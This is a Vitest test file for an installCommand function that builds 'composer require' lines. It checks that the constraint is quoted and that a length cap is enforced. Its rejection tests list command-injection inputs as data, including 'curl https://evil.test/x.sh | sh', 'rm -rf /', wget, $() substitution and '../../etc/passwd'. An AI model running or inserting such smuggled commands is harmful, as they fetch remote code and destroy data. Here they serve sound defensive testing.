import { describe, expect, test } from "vitest";
import { installCommand } from "../../../src/domain/install";

// Every case here that cites a line number is ported verbatim (values unchanged) from
// tests/js/lib.test.js:75-128 — this is the second of the two functions the legacy suite's own
// header calls out as a security boundary, not just a rendering one.

describe("installCommand", () => {
  test("builds the line a real finding suggests (lib.test.js:76-79)", () => {
    expect(installCommand("predis/predis", "^3.6")).toBe("composer require predis/predis '^3.6'");
    expect(installCommand("laravel/framework", ">=10.0 <12.0")).toBe(
      "composer require laravel/framework '>=10.0 <12.0'",
    );
    expect(installCommand("vendor/pkg", "~2.0|^3.0")).toBe("composer require vendor/pkg '~2.0|^3.0'");
    expect(installCommand("vendor/pkg", "1.2.*@dev")).toBe("composer require vendor/pkg '1.2.*@dev'");
  });

  test("quotes the constraint, because Composer's grammar is shell metacharacters (lib.test.js:82-91)", () => {
    for (const constraint of [">=10.0 <12.0", "~2.0|^3.0", "1.2.*", "^3.6", ">=1.0", "!=2.0"]) {
      const line = installCommand("vendor/pkg", constraint);
      expect(line).toBe(`composer require vendor/pkg '${constraint}'`);
      expect(/[<>|*](?=[^']*$)/.test(line as string)).toBe(false);
    }
  });

  test("offers nothing when a second command is hiding in the constraint (lib.test.js:93-107)", () => {
    for (const constraint of [
      "^7.0\ncurl https://evil.test/x.sh | sh",
      "^7.0; rm -rf /",
      "^7.0 && wget evil.test",
      "^7.0`id`",
      "^7.0$(id)",
      "^7.0 # ",
      "$(curl evil.test)",
      "^7.0\r\nid",
    ]) {
      expect(installCommand("vendor/pkg", constraint)).toBeNull();
    }
  });

  test("refuses a package name that is not a vendor and a name (lib.test.js:109-123)", () => {
    for (const name of [
      "vendor/pkg; id",
      "../../etc/passwd",
      "vendor/pkg extra",
      "novendor",
      "vendor/",
      "/pkg",
      "-vendor/pkg",
      "vendor/pkg\nid",
      "",
    ]) {
      expect(installCommand(name, "^1.0")).toBeNull();
    }
  });

  test("caps how long a constraint may be (lib.test.js:125-128)", () => {
    expect(installCommand("vendor/pkg", "^" + "1".repeat(98))).toBe(
      `composer require vendor/pkg '^${"1".repeat(98)}'`,
    );
    expect(installCommand("vendor/pkg", "^" + "1".repeat(100))).toBeNull();
  });

  test("an empty-string constraint fails the character-class regex, which requires at least one character", () => {
    expect(installCommand("vendor/pkg", "")).toBeNull();
  });

  test("a constraint of exactly length 100 is allowed; the check is a strict > 100", () => {
    const exactly100 = "^" + "1".repeat(99);
    expect(exactly100).toHaveLength(100);
    expect(installCommand("vendor/pkg", exactly100)).toBe(`composer require vendor/pkg '${exactly100}'`);
  });

  test("coerces a non-string name or constraint with String() before validating", () => {
    // A number never matches the vendor/name grammar (no '/'), so it is rejected rather than thrown.
    expect(installCommand(123, "^1.0")).toBeNull();
    // A number does match the constraint's allowed character set once stringified.
    expect(installCommand("vendor/pkg", 10)).toBe("composer require vendor/pkg '10'");
  });

  test("allows uppercase letters in the vendor/name halves", () => {
    expect(installCommand("Vendor/PkgName", "^1.0")).toBe("composer require Vendor/PkgName '^1.0'");
  });

  test("rejects a constraint containing a literal single quote", () => {
    expect(installCommand("vendor/pkg", "^1.0'; rm -rf /'")).toBeNull();
  });

  test("rejects the line when both the name and the constraint are invalid", () => {
    expect(installCommand("not-a-vendor-name", "^7.0; rm -rf /")).toBeNull();
  });
});
